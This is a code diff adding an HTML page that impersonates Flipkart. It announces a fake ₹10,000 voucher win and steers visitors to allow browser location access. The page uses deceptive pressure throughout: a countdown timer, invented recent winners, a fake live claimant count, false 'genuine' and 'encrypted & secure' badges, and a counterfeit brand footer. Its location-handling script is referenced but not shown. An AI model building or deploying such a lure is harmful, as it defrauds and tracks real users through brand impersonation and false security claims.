@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Flipkart - Congratulations! You Won ₹10,000</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- Flipkart Header -->
+  <header class="flipkart-header">
+    <div class="header-content">
+      <div class="flipkart-logo">
+        <span class="logo-text">Flipkart</span>
+        <span class="logo-subtext">Explore <span class="plus">Plus</span> ⭐</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Celebration Banner -->
+  <div class="celebration-banner">
+    <div class="confetti">🎊</div>
+    <div class="confetti">🎉</div>
+    <div class="confetti">✨</div>
+    <div class="confetti">🎈</div>
+  </div>
+
+  <!-- Main Container -->
+  <div class="container">
+    <!-- Winner Badge -->
+    <div class="winner-badge">
+      <div class="badge-icon">🏆</div>
+      <div class="badge-text">
+        <div class="badge-title">CONGRATULATIONS!</div>
+        <div class="badge-subtitle">You are today's Lucky Winner</div>
+      </div>
+    </div>
+
+    <!-- Prize Card -->
+    <div class="prize-card">
+      <div class="prize-header">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 24 24' fill='%23FFD700'%3E%3Cpath d='M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z'/%3E%3C/svg%3E" alt="Star" class="prize-icon">
+        <h1 class="prize-title">You Won!</h1>
+        <div class="prize-amount">₹10,000</div>
+        <div class="prize-subtitle">Flipkart Gift Voucher</div>
+      </div>
+
+      <!-- Winner ID -->
+      <div class="winner-id-section">
+        <div class="winner-label">Winner ID</div>
+        <div class="winner-code" id="winnerId">FKW-<span id="randomCode">849273</span></div>
+      </div>
+
+      <!-- Timer -->
+      <div class="timer-section">
+        <div class="timer-icon">⏰</div>
+        <div class="timer-content">
+          <div class="timer-label">Offer Expires In:</div>
+          <div class="timer-countdown" id="countdown">09:59</div>
+        </div>
+      </div>
+
+      <!-- How to Claim Section -->
+      <div class="claim-section">
+        <h2 class="section-title">📋 How to Claim Your Prize</h2>
+        
+        <div class="steps">
+          <div class="step">
+            <div class="step-number">1</div>
+            <div class="step-content">
+              <h3>Click "Claim Now" Button</h3>
+              <p>Start the verification process</p>
+            </div>
+          </div>
+
+          <div class="step step-highlight">
+            <div class="step-number">2</div>
+            <div class="step-content">
+              <h3>Enable Location Access</h3>
+              <p><strong>Important:</strong> We need to verify your location to prevent fraud and ensure prize delivery to the correct person</p>
+              <div class="security-badge">
+                🔒 Your data is encrypted & secure
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-number">3</div>
+            <div class="step-content">
+              <h3>Get Your Voucher Code</h3>
+              <p>Receive ₹10,000 voucher instantly via SMS & Email</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Why Location Section -->
+      <div class="info-section">
+        <div class="info-title">🛡️ Why We Need Location?</div>
+        <ul class="info-list">
+          <li>✓ Verify you're in India (Flipkart service area)</li>
+          <li>✓ Prevent fraudulent claims from same location</li>
+          <li>✓ Ensure prize delivery to genuine winners</li>
+          <li>✓ Comply with legal requirements</li>
+        </ul>
+      </div>
+
+      <!-- Recent Winners -->
+      <div class="winners-section">
+        <h3 class="winners-title">🎉 Recent Winners Today</h3>
+        <div class="winners-list">
+          <div class="winner-item">
+            <div class="winner-avatar">R</div>
+            <div class="winner-details">
+              <div class="winner-name">Sai Ratna.</div>
+              <div class="winner-location">Kakinada, Andrapradesh</div>
+            </div>
+            <div class="winner-prize">₹10,000</div>
+          </div>
+          <div class="winner-item">
+            <div class="winner-avatar">P</div>
+            <div class="winner-details">
+              <div class="winner-name">Sai Komal.</div>
+              <div class="winner-location">khammam, Wyra</div>
+            </div>
+            <div class="winner-prize">₹10,000</div>
+          </div>
+          <div class="winner-item">
+            <div class="winner-avatar">A</div>
+            <div class="winner-details">
+              <div class="winner-name">Manjunath.</div>
+              <div class="winner-location">Sathupally, NCR</div>
+            </div>
+            <div class="winner-prize">₹10,000</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Trust Badges -->
+      <div class="trust-badges">
+        <div class="trust-badge">
+          <div class="trust-icon">✓</div>
+          <div class="trust-text">100% Genuine</div>
+        </div>
+        <div class="trust-badge">
+          <div class="trust-icon">🔒</div>
+          <div class="trust-text">Secure</div>
+        </div>
+        <div class="trust-badge">
+          <div class="trust-icon">⚡</div>
+          <div class="trust-text">Instant</div>
+        </div>
+        <div class="trust-badge">
+          <div class="trust-icon">🎁</div>
+          <div class="trust-text">Free</div>
+        </div>
+      </div>
+
+      <!-- Claim Button -->
+      <button class="claim-button" id="claimBtn">
+        <span class="button-icon">🎁</span>
+        <span class="button-text">CLAIM ₹10,000 NOW</span>
+        <span class="button-arrow">→</span>
+      </button>
+
+      <!-- Status Message -->
+      <div class="status-message" id="statusMessage"></div>
+
+      <!-- Footer Note -->
+      <div class="footer-note">
+        <p>* This is a limited time offer for selected users only</p>
+        <p>* No payment required • 100% Free • Valid for 24 hours</p>
+        <div class="active-users">
+          <span class="pulse-dot"></span>
+          <span>2,847 people claiming prizes right now</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Location Permission Modal -->
+  <div class="location-modal" id="locationModal">
+    <div class="modal-overlay"></div>
+    <div class="modal-container">
+      <div class="modal-header">
+        <div class="modal-icon">📍</div>
+        <h2>Enable Location Access</h2>
+        <p>Required for prize verification</p>
+      </div>
+
+      <div class="modal-body">
+        <div class="modal-info">
+          <div class="info-item">
+            <span class="info-icon">1️⃣</span>
+            <span>Your browser will show a permission popup</span>
+          </div>
+          <div class="info-item">
+            <span class="info-icon">2️⃣</span>
+            <span>Click <strong>"Allow"</strong> or <strong>"Share Location"</strong></span>
+          </div>
+          <div class="info-item">
+            <span class="info-icon">3️⃣</span>
+            <span>Your ₹10,000 voucher will be generated!</span>
+          </div>
+        </div>
+
+        <div class="modal-status" id="modalStatus">
+          <div class="loading-spinner"></div>
+          <p>Waiting for location permission...</p>
+          <small>Please allow location access when prompted</small>
+        </div>
+
+        <div class="modal-security">
+          🔒 Your location is only used for verification • Fully encrypted & secure
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Flipkart Footer -->
+  <footer class="flipkart-footer">
+    <div class="footer-content">
+      <p>© 2024 Flipkart.com</p>
+      <p class="footer-links">
+        <a href="#">Terms</a> • 
+        <a href="#">Privacy</a> • 
+        <a href="#">Help</a>
+      </p>
+    </div>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
